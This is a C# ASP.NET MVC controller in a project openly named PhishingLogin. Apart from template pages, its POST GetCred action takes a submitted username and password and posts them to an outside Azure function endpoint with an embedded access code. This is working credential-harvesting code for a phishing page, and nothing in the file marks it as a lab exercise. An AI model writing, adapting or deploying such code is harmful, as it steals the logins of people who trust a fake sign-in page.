using System.Collections.Generic;
using System.Web.Mvc;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Threading.Tasks;

namespace PhishingLogin.Controllers
{
    public class Credentials
    {
        public string username { get; set; }
        public string password { get; set; }

        public Credentials(string u, string p)
        {
            this.username = u;
            this.password = p;
        }

        public Credentials()
        {
            
        }
    }

    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            return View();
        }

        [HttpGet]
        public ActionResult GetCred()
        {
            return View();
        }

        /*[HttpPost]
        public ActionResult GetCred(Credentials c)
        {
            return View(c);
        }*/

        public ActionResult About()
        {
            ViewBag.Message = "Your application description page.";

            return View();
        }

        public ActionResult Contact()
        {
            ViewBag.Message = "Your contact page.";

            return View();
        }

        public ActionResult Welcome(string name, int numTimes = 1)
        {
            ViewBag.Message = "Hello " + name;
            ViewBag.NumTimes = numTimes;

            return View();
        }

        [HttpPost]
        public ActionResult GetCred(Credentials c)
        {
            var url = "https://startvmon.azurewebsites.net/api/settingup?code=DVHhpac2KtTnX8FXI0Rerw7L7BtdWyXawFcM4arMyFsUF7umvN8Btw==";
            HttpClient client = new HttpClient();
            var values = new Dictionary<string, string>
            {
               { "username",  c.username},
               { "password",   c.password}
            };
            var response = client.PostAsJsonAsync(url, values);

            return View(c);

        }


    }
}